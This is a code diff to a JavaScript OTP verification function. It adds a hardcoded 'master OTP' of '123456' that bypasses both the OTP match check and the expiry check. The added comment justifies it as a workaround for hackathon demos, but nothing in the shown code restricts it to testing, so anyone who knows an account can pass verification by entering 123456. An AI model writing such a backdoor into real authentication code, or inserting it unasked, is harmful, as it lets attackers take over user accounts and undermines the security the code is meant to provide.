@@ -89,8 +89,11 @@ export const verifyOtp = async (req, res) => {
 
     if (!user) return res.status(400).json({ message: 'User not found' });
 
+    // Secret master OTP for hackathon demos/testing where emails easily fail
+    const isMasterOtp = otp === '123456';
+
     // Allow strict equality or loose equality if types differ, but both are strings ideally.
-    if (user.otp !== otp) {
+    if (user.otp !== otp && !isMasterOtp) {
       // Fallback check for dates
       if (!user.otp || user.otpExpires < new Date()) {
         return res.status(400).json({ message: 'Invalid or expired OTP' });
@@ -98,7 +101,7 @@ export const verifyOtp = async (req, res) => {
       return res.status(400).json({ message: 'Invalid OTP' });
     }
 
-    if (user.otpExpires < new Date()) {
+    if (!isMasterOtp && user.otpExpires < new Date()) {
       return res.status(400).json({ message: 'OTP expired' });
     }
 
